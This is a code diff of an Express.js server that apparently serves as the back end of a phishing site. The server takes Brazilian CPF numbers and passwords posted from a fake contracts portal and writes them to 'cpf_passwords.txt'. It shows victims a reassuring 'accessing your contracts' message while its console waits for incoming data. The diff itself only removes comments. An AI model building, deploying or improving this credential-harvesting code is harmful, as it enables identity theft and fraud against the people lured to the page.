@@ -1,20 +1,15 @@
-// 1. Importar bibliotecas
 const express = require('express');
 const cors = require('cors');
-const fs = require('fs'); // fs = File System, para manipular arquivos
-const path = require('path'); // Módulo 'path' para lidar com caminhos de arquivos
+const fs = require('fs');
+const path = require('path');
 
-// 2. Configurações
 const app = express();
 const port = process.env.PORT || 3000;
 const NOME_ARQUIVO_LOG = 'cpf_passwords.txt';
 
-// 3. Middlewares
 app.use(cors());
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
-
-// 4. Rotas da API
 
 app.post('/salvar-dados', (req, res) => {
     const { cpf, senha } = req.body;
@@ -77,7 +72,6 @@ app.post('/acessar-contratos', (req, res) => {
     res.status(200).json({ message: 'Acessando seus contratos. Por favor, aguarde...' });
 });
 
-// 5. Inicia o servidor
 app.listen(port, () => {
     console.log(`Сервер запущен на порту ${port}`);
     console.log(`Ожидание данных... Логи выводятся в этот консоль.`);
